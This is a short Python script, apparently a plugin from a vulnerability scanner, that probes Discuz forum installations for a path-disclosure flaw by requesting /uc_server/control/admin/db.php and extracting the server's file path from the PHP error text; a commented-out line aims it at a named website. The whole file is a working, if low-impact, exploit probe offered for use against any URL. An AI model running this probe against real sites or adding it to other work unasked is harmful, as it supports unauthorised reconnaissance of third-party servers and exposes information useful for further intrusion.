#!/usr/bin/env python
import requests
from termcolor import cprint
import re

class Exploit:
    def attack(self, url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/uc_server/control/admin/db.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            m = re.search('not found in [<b>]*([^<]+)[</b>]* on line [<b>]*(\d+)', req.text)
            if m:
                cprint("[+]discuz存在爆路径漏洞...(低危) [{}] payload: {}".format(m.group(1), vulnurl), "red")
                return '存在爆路径漏洞：{}'.format(m.group(1))

        except:
            return None

#Exploit().attack('http://www.lockbay.cn')